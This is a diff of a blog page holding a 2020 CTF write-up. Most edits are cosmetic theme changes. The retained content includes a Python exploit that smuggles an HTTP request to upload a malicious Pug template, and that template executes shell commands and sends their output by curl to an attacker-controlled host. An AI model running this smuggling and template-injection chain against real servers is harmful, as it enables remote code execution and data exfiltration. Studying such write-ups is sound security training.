@@ -10,8 +10,6 @@
 
 
 
-<meta name="description" content="web && ctf && code">
-
 
 
 
@@ -23,7 +21,7 @@
 <link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png">
 
 
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato|Source+Code+Pro">
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
 
 
@@ -211,18 +209,19 @@
     <article class="article content gallery" itemscope itemprop="blogPost">
     <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
         
-            新春公益赛2020wp
+        新春公益赛2020wp
         
     </h1>
     <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
-            <span class="column is-narrow">
-        
-                    
-                    <time datetime="2020-02-24T10:29:07.000Z" itemprop="datePublished">Feb 24 2020</time> Post
-                
-                  
-        
-            </span>
+        <span class="column is-narrow">
+            
+            
+            <time datetime="2020-02-24T10:29:07.000Z"
+                itemprop="datePublished">Feb 24 2020</time> 发布
+            
+
+            
+        </span>
         
         <span class="column is-narrow article-category">
             <i class="far fa-folder"></i>
@@ -230,9 +229,16 @@
         </span>
         
         
+        <span id="busuanzi_container_page_pv" class="column is-narrow article-category">
+            <i class="fas fa-eye" sytle="color:red;"></i>  热度: <span id="busuanzi_value_page_pv"></span> ℃
+            
+            
+        </span>
+        
+        
     </div>
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
-    
+        
         <html><head></head><body><p>有一两道挺有意思的</p>
 <a id="more"></a>
 
@@ -403,16 +409,17 @@
 <p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote</span><br><span class="line">url = <span class="hljs-string">"http://182.92.243.154:33323/"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span><span class="hljs-params">(cmd)</span>:</span></span><br><span class="line">    payload = <span class="hljs-string">''' HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: x</span></span><br><span class="line"><span class="hljs-string">Connection: keep-alive</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: x</span></span><br><span class="line"><span class="hljs-string">Content-Length: 304</span></span><br><span class="line"><span class="hljs-string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBOpB7RbAKnIckY80</span></span><br><span class="line"><span class="hljs-string">Connection: keep-alive</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">------WebKitFormBoundaryBOpB7RbAKnIckY80</span></span><br><span class="line"><span class="hljs-string">Content-Disposition: form-data; name="file"; filename="cjm00n.pug"</span></span><br><span class="line"><span class="hljs-string">Content-Type: ../template</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">- global.process.mainModule.require('child_process').execSync('curl http://ip:port/ -X POST -d `evalcmd`')</span></span><br><span class="line"><span class="hljs-string">------WebKitFormBoundaryBOpB7RbAKnIckY80--</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: x</span></span><br><span class="line"><span class="hljs-string">Connection: close</span></span><br><span class="line"><span class="hljs-string">x: '''</span></span><br><span class="line">    payload = payload.replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">"\r\n"</span>).replace(<span class="hljs-string">"evalcmd"</span>, cmd).replace(<span class="hljs-string">"304"</span>, str(<span class="hljs-number">297</span> + len(cmd)))</span><br><span class="line">    payload = <span class="hljs-string">''</span>.join(chr(int(<span class="hljs-string">'0xee'</span> + hex(ord(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)</span><br><span class="line">    params = {</span><br><span class="line">        <span class="hljs-string">"q"</span>: payload</span><br><span class="line">    }</span><br><span class="line">    requests.get(<span class="hljs-string">f"<span class="hljs-subst">{url}</span>core"</span>, params=params,)</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        requests.get(<span class="hljs-string">f"<span class="hljs-subst">{url}</span>?action=cjm00n"</span>, timeout=<span class="hljs-number">2</span>)</span><br><span class="line">    <span class="hljs-keyword">except</span>:</span><br><span class="line">        print(<span class="hljs-string">"done"</span>)</span><br><span class="line">    <span class="hljs-comment"># print(res)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp_code</span><span class="hljs-params">(word)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> quote(<span class="hljs-string">''</span>.join(chr(int(<span class="hljs-string">'0xff'</span> + hex(ord(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> word))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    upload(<span class="hljs-string">"cat /flag.txt"</span>)</span><br><span class="line">    <span class="hljs-comment"># print(exp_code("`"))</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>使用的时候替换一下ip和port, 以及重新计算一下<code>Content-Length</code></p>
 <p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200224183050.png" alt></p>
-<p><br></p><blockquote class="colorquote info"><p>本文作者：cjm00n<br>本文地址： <a href="https://cjm00n.top/2020/02/24/新春公益赛2020wp/">https://cjm00n.top/2020/02/24/新春公益赛2020wp/</a> <br>版权声明：除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
+<p><br></p><blockquote class="colorquote info"><p>本文作者: cjm00n<br>本文地址: <a href="https://cjm00n.top/2020/02/24/新春公益赛2020wp/">https://cjm00n.top/2020/02/24/新春公益赛2020wp/</a> <br>版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
 </blockquote><p></p>
 </body></html>
-    
+        
     </div>
     
     <div class="columns is-variable is-1 is-multiline is-mobile">
-    
-        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Writeup/">#Writeup</a></span>
-    
+        
+        <span class="column is-narrow"><a class="tag is-light article-tag"
+                href="/tags/Writeup/">#Writeup</a></span>
+        
     </div>
     
     
@@ -474,9 +481,6 @@
             <div class="column is-narrow has-text-centered">
                 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
                 </script>
-            <span id="busuanzi_container_page_pv"> 
-                <i class="fas fa-eye"></i> clicked: <a href="#"><span id="busuanzi_value_page_pv"></span></a> times
-              </span>
             </div>
             
             
